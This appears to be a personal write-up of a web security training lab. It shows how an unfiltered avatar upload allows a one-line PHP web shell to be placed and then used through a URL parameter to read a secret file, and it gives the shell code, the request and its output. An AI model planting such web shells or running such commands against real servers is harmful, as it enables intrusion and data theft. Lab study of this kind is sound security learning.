# 1. Remote code execution via web shell upload(no filter)

**Goal** : take RCE of server and find the secret in /home/carlos/secret

**Steps** : 

- 1st i login using weiner and peter credentials.
- then i upload a .png file to check where it uploaded
    - it upload successfully in /files/avatar directory.(dir found by opening image in a new tab)
- then i write a simple php backdoor code for RCE. and save this as a shell.php file

```php
<?php system($_GET['cmd']);?>
```

- then i upload it on the server, hurreyyy it uploaded successfully. it means there’s no filter.

### Then :

- open that shell.php in a new tab, it opens like this

```php
https://0a420007047dc58f802cf338004a008d.web-security-academy.net/files/avatars/shell.php
```

- then, executing commands to find the secret :

```php
https://0a420007047dc58f802cf338004a008d.web-security-academy.net/files/avatars/shell.php?cmd=cat /home/carlos/secret

O/P→ uDDtOD31zRfquoSZWlXVGxMVZ7cfyY2u
```

LAB SOLVED. 😎